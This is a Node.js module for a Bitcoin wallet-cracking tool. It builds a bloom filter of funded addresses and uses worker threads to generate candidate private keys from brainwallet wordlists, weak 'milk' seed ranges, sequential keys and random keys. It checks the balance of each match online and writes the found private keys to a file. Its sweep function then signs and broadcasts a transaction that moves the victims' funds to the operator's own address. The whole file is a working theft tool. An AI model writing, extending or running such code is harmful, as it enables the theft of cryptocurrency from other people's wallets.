import fs from 'node:fs';
import zlib from 'node:zlib';
import readline from 'node:readline';
import { Worker } from 'node:worker_threads';
import * as L from './lib.mjs';
import * as btc from '@scure/btc-signer';

let cfg = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
let emit = () => {};
export const setEmitter = fn => { emit = fn; };
export const getConfig = () => cfg;

const state = { running:false, total:0, hits:0, swept:0, t0:0, mode:'-', bloom:null, threads:0, building:false };
let hits = [], workers = [], SAB = null, MASK = 0, K = 0, seen = new Set();

export const getState = () => ({ ...state, hitsList: hits });

export function saveConfig(patch) {
  cfg = { ...cfg, ...patch };
  fs.writeFileSync('./config.json', JSON.stringify(cfg, null, 2));
  return cfg;
}

export function loadBloom() {
  if (!fs.existsSync(cfg.bloomFile)) { state.bloom = null; return null; }
  const raw = fs.readFileSync(cfg.bloomFile);
  if (raw.subarray(0,4).toString() !== 'OMGB') { state.bloom = null; return null; }
  K = raw[4]; MASK = raw.readUInt32LE(5);
  const data = raw.subarray(9);
  SAB = new SharedArrayBuffer(data.length);
  new Uint8Array(SAB).set(data);
  state.bloom = { file: cfg.bloomFile, mb: (data.length/1048576).toFixed(1), k: K };
  emit('log', { msg: `Bloom loaded: ${state.bloom.mb} MB (k=${K})`, cls:'ok' });
  return state.bloom;
}

export async function buildBloom(file) {
  if (state.building) return;
  if (!fs.existsSync(file)) { emit('log', { msg:`File nahi mila: ${file}`, cls:'bad' }); return; }
  state.building = true;
  emit('log', { msg:`Bloom build start: ${file}`, cls:'blu' });

  const FPR = 0.0001, LOG2 = Math.LN2;
  const stream = file.endsWith('.gz') ? fs.createReadStream(file).pipe(zlib.createGunzip()) : fs.createReadStream(file);
  const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });

  let col = -1, header = null, keys = [];
  for await (const line of rl) {
    if (!line.trim()) continue;
    const parts = line.split('\t');
    if (header === null) {
      header = parts;
      col = header.findIndex(h => h.toLowerCase() === 'address');
      if (col < 0) col = 0;
      if (header[0].toLowerCase() === 'address') continue;
    }
    const kk = L.addrToKey((parts[col]||'').trim());
    if (kk) keys.push(kk);
    if (keys.length % 500000 === 0) emit('bloomProgress', { phase:'read', n: keys.length });
  }
  emit('log', { msg:`${keys.length.toLocaleString()} addresses mile`, cls:'ok' });

  const n = Math.max(keys.length, 1000);
  let m = Math.ceil(n * Math.log(1/FPR) / (LOG2*LOG2));
  let p = 1; while ((1 << p) < m) p++;
  const mask = (1 << p) - 1, bytes = (mask+1) >> 3, k = Math.round((mask+1)/n * LOG2);
  emit('log', { msg:`Bloom size: ${(bytes/1048576).toFixed(1)} MB | k=${k}`, cls:'blu' });

  const bloom = Buffer.alloc(bytes);
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    const h1 = key.readUInt32LE(0), h2 = key.readUInt32LE(4) | 1;
    for (let j = 0; j < k; j++) {
      const idx = ((h1 + Math.imul(j, h2)) >>> 0) & mask;
      bloom[idx >> 3] |= (1 << (idx & 7));
    }
    if (i % 500000 === 0) emit('bloomProgress', { phase:'build', n:i, total:keys.length });
  }
  const hb = Buffer.alloc(9); hb.write('OMGB',0,'ascii'); hb[4]=k; hb.writeUInt32LE(mask,5);
  fs.writeFileSync(cfg.bloomFile, Buffer.concat([hb, bloom]));
  state.building = false;
  emit('log', { msg:`${cfg.bloomFile} ready (${((bytes+9)/1048576).toFixed(1)} MB)`, cls:'ok' });
  loadBloom();
  emit('state', getState());
}

async function sweep(w) {
  const utxo = await (await fetch(`https://blockstream.info/api/address/${w.addr}/utxo`)).json();
  if (!utxo.length) return { ok:false, reason:'no utxo' };
  const tot = utxo.reduce((s,u)=>s+u.value,0);
  const fees = await (await fetch('https://mempool.space/api/v1/fees/recommended')).json();
  const rate = Math.max(fees.halfHourFee || 12, 5);
  const tx = new btc.Transaction({ allowLegacyWitnessUtxo: true });
  const spk = w.type === 'legacy' ? btc.p2pkh(w.pub, btc.NETWORK) : btc.p2wpkh(w.pub, btc.NETWORK);
  for (const u of utxo) {
    if (w.type === 'legacy') {
      const hx = await (await fetch(`https://blockstream.info/api/tx/${u.txid}/hex`)).text();
      tx.addInput({ txid: L.hexToBytes(u.txid), index: u.vout, nonWitnessUtxo: L.hexToBytes(hx.trim()) });
    } else tx.addInput({ txid: L.hexToBytes(u.txid), index: u.vout, witnessUtxo: { script: spk.script, amount: BigInt(u.value) } });
  }
  const vb = w.type === 'legacy' ? 10 + utxo.length*148 + 34 : 11 + utxo.length*68 + 31;
  const fee = Math.ceil(vb * rate), send = tot - fee;
  if (send <= 546) return { ok:false, reason:`dust (${tot} sats)` };
  tx.addOutputAddress(cfg.myAddress, BigInt(send), btc.NETWORK);
  tx.sign(w.priv); try { tx.finalize(); } catch(e) {}
  const txid = await (await fetch('https://blockstream.info/api/tx', { method:'POST', body: tx.hex })).text();
  return { ok:true, txid, send };
}

async function onHit(w, bal) {
  state.hits++;
  const rec = { time:new Date().toISOString(), addr:w.addr, bal, priv:L.toHex(w.priv), wif:w.wif, tag:w.tag, txid:null };
  emit('log', { msg:`HIT ${w.addr} - ${bal} sats [${w.tag}]`, cls:'hit' });
  if (cfg.autoSweep && cfg.myAddress && bal >= (cfg.minSweepSats||2000)) {
    try {
      const r = await sweep(w);
      if (r.ok) { state.swept++; rec.txid = r.txid; emit('log', { msg:`SWEPT ${r.send} sats -> ${cfg.myAddress} | ${r.txid}`, cls:'ok' }); }
      else emit('log', { msg:`sweep skip: ${r.reason}`, cls:'warn' });
    } catch (e) { emit('log', { msg:`sweep error: ${e.message}`, cls:'bad' }); }
  }
  hits.unshift(rec);
  fs.appendFileSync('hits.txt', `${rec.time}\t${rec.addr}\t${bal}\t${rec.priv}\t${rec.wif}\t${rec.tag}\n`);
  emit('hit', rec);
  emit('state', getState());
}

async function verify(privHex, tag) {
  const priv = L.hexToBytes(privHex);
  const d = L.keyToAddrs(priv);
  if (!d) return;
  for (const [type, addr] of [['segwit', d.segwit], ['legacy', d.legacy]]) {
    try {
      const j = await (await fetch(`https://blockstream.info/api/address/${addr}`)).json();
      const bal = (j.chain_stats.funded_txo_sum - j.chain_stats.spent_txo_sum) + (j.mempool_stats.funded_txo_sum - j.mempool_stats.spent_txo_sum);
      if (bal > 0) await onHit({ priv, ...d, addr, type, tag }, bal);
    } catch (e) {}
  }
}

function loadWords() {
  let w = [];
  for (const f of (cfg.brain?.wordlists || [])) if (fs.existsSync(f)) w.push(...fs.readFileSync(f,'utf8').split('\n').map(s=>s.trim()).filter(Boolean));
  w.push(...(cfg.brain?.extraPhrases || []));
  if (!w.length) w = ['satoshi','password','bitcoin','hello world','secret'];
  return [...new Set(w)];
}

export function startScan(patch = {}) {
  if (state.running) return;
  if (patch && Object.keys(patch).length) saveConfig(patch);
  if (!SAB) loadBloom();
  if (!SAB) { emit('log', { msg:'Pehle bloom filter banao', cls:'bad' }); return; }

  state.running = true; state.t0 = Date.now();
  state.total = 0; state.mode = cfg.mode; state.threads = cfg.threads;
  seen = new Set();
  emit('log', { msg:`Scan start - mode: ${cfg.mode}, threads: ${cfg.threads}`, cls:'ok' });

  const T = cfg.threads, jobs = [], mode = cfg.mode;
  if (mode === 'milk' || mode === 'milkHD') {
    const per = Math.ceil((cfg.milk.endSeed - cfg.milk.startSeed) / T);
    for (let t=0;t<T;t++){ const s=cfg.milk.startSeed+t*per, e=Math.min(s+per,cfg.milk.endSeed); if(s<e) jobs.push({mode,start:s,end:e}); }
  } else if (mode === 'brain') {
    const words = loadWords(), rounds = cfg.brain?.rounds || 7, total = words.length*rounds, per = Math.ceil(total/T);
    emit('log', { msg:`${words.length} words x ${rounds} variants = ${total.toLocaleString()} keys`, cls:'blu' });
    for (let t=0;t<T;t++){ const s=t*per,e=Math.min(s+per,total); if(s<e) jobs.push({mode,start:s,end:e,words}); }
  } else if (mode === 'seq') {
    const total = BigInt(cfg.seq.count), per = (total+BigInt(T)-1n)/BigInt(T);
    for (let t=0;t<T;t++){ const b=BigInt(cfg.seq.base)+BigInt(t)*per; if(b<BigInt(cfg.seq.base)+total) jobs.push({mode,base:b.toString(),count:Number(per)}); }
  } else {
    const per = Math.ceil((cfg.random?.count||1e8)/T);
    for (let t=0;t<T;t++) jobs.push({mode:'random',count:per});
  }

  let doneCount = 0;
  workers = jobs.map(j => {
    const w = new Worker(new URL('./worker.mjs', import.meta.url), { workerData:{ ...j, sab:SAB, mask:MASK, k:K } });
    w.on('message', m => {
      if (m.type === 'progress') state.total += m.n;
      else if (m.type === 'hit') { if (!seen.has(m.priv)) { seen.add(m.priv); verify(m.priv, m.tag); } }
      else if (m.type === 'done') { doneCount++; if (doneCount === jobs.length) finish(); }
    });
    w.on('error', e => emit('log', { msg:'worker error: '+e.message, cls:'bad' }));
    return w;
  });
  emit('state', getState());
}

function finish() {
  if (!state.running) return;
  state.running = false;
  const sec = (Date.now()-state.t0)/1000;
  emit('log', { msg:`DONE - ${state.total.toLocaleString()} keys | ${Math.round(state.total/sec).toLocaleString()} keys/s | hits: ${state.hits}`, cls:'ok' });
  emit('state', getState());
}

export function stopScan() {
  for (const w of workers) w.terminate();
  workers = [];
  if (state.running) { state.running = false; emit('log', { msg:'Stopped', cls:'warn' }); emit('state', getState()); }
}

setInterval(() => { if (state.running) emit('state', getState()); }, 1000);